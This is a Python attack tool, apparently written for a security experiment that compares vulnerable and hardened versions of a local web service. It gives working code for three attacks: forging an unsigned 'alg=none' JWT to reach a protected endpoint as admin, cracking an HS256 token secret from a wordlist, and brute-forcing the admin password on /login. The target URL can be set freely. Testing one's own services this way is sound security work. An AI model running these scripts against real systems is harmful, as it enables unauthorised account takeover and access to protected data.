"""Experiment 2 attack scripts: jwt-none, jwt-crack, brute-force.

Usage:
    python attack.py --mode jwt-none   --target http://localhost:8000 --user admin
    python attack.py --mode jwt-crack  --target http://localhost:8000
    python attack.py --mode brute-force --target http://localhost:8000 --wordlist data/top1000.txt
"""

from __future__ import annotations

import argparse
import base64
import json
import sys

import requests


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def attack_jwt_none(target: str, user: str) -> None:
    """Forge a JWT with alg=none and send to /protected."""
    header = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({"sub": user, "role": "admin"}).encode())
    forged = f"{header}.{payload}."

    print(f"[jwt-none] Forged token: {forged[:60]}...")
    resp = requests.get(
        f"{target}/protected", headers={"Authorization": f"Bearer {forged}"}, timeout=5
    )
    print(f"[jwt-none] Response {resp.status_code}: {resp.text}")
    if resp.status_code == 200:
        print("[jwt-none] SUCCESS — server accepted forged token.")
    else:
        print("[jwt-none] BLOCKED — server rejected alg=none token (hardened).")


def attack_jwt_crack(target: str) -> None:
    """Capture a token from /login then brute-force the HS256 secret."""
    import jwt

    print("[jwt-crack] Capturing token from /login ...")
    resp = requests.post(
        f"{target}/login",
        data={"username": "alice", "password": "alice456"},
        timeout=5,
    )
    if resp.status_code != 200:
        print(f"[jwt-crack] Login failed: {resp.status_code} {resp.text}")
        return

    token = resp.json().get("access_token", "")
    print(f"[jwt-crack] Got token: {token[:40]}...")

    wordlist = ["password", "secret", "123456", "admin", "qwerty", "letmein"]
    for word in wordlist:
        try:
            jwt.decode(token, word, algorithms=["HS256"], options={"verify_exp": False})
            print(f"[jwt-crack] SUCCESS — secret cracked: '{word}'")
            return
        except jwt.InvalidSignatureError:
            continue
        except jwt.DecodeError:
            print("[jwt-crack] Token may use asymmetric algorithm (RS256) — crack impossible.")
            return

    print("[jwt-crack] Secret not found in wordlist (may be using RS256).")


def attack_brute_force(target: str, wordlist_path: str) -> None:
    """Brute-force /login until 429 or success."""
    try:
        with open(wordlist_path) as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        passwords = [
            "password",
            "admin123",
            "alice456",
            "letmein",
            "qwerty",
            "123456",
            "pass",
            "test",
            "root",
            "admin",
        ]
        print(f"[brute-force] Wordlist not found; using {len(passwords)}-entry built-in list")

    print(f"[brute-force] Trying {len(passwords)} passwords against {target}/login ...")
    for i, pwd in enumerate(passwords, 1):
        resp = requests.post(
            f"{target}/login",
            data={"username": "admin", "password": pwd},
            timeout=5,
        )
        if resp.status_code == 429:
            print(f"[brute-force] RATE LIMITED after {i} attempts — hardened mode working.")
            return
        if resp.status_code == 200:
            print(f"[brute-force] SUCCESS — found password '{pwd}' on attempt {i}")
            return
        if i % 10 == 0:
            print(f"[brute-force] {i} attempts, still trying...")

    print(f"[brute-force] Exhausted {len(passwords)} passwords — no match found.")


def main() -> None:
    parser = argparse.ArgumentParser(description="Experiment 2 attack tool")
    parser.add_argument("--mode", choices=["jwt-none", "jwt-crack", "brute-force"], required=True)
    parser.add_argument("--target", default="http://localhost:8000")
    parser.add_argument("--user", default="admin")
    parser.add_argument("--wordlist", default="data/top1000.txt")
    args = parser.parse_args()

    if args.mode == "jwt-none":
        attack_jwt_none(args.target, args.user)
    elif args.mode == "jwt-crack":
        attack_jwt_crack(args.target)
    elif args.mode == "brute-force":
        attack_brute_force(args.target, args.wordlist)


if __name__ == "__main__":
    main()
